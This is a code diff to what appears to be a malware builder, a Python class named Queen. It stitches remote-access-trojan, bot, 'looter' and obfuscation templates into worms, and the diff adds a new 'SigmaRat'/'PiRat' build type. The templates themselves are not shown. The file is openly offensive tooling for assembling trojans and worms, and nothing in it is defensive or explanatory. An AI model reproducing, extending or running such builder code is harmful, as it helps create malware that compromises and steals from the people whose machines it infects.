@@ -21,7 +21,8 @@ class Queen:
                     "basic_rat" : self.loadTemp("basicRat.py"),
                     "basic_bot" : self.loadTemp("basicBot.py"),
                     "advanced" : self.loadTemp("advW.py"),
-                    "looter" : self.loadTemp("looter.py")}
+                    "looter" : self.loadTemp("looter.py"),
+                    "piRat" : self.loadTemp("piRat.py")}
         self._emptyConf = {"MULTIPROCESING_FREEZE" : None, "INFECT_WIN" : False}
 
 
@@ -103,6 +104,11 @@ class Queen:
                 b = self.renderTemplate("advanced")
                 c = self.renderTemplate("looter", conf)
                 types += "_looter"
+            case "SigmaRat":
+                conf.update({"WORM_NAME": "PiRat"})
+                a = self.renderTemplate("basic", conf)
+                b = self.renderTemplate("advanced")
+                c = self.renderTemplate("piRat")
         startup = self.renderTemplate("start", conf)
         fcode = self.chamCode + a + b + c + d + startup
         worm_name = self.saveWorm(name, types, fcode)
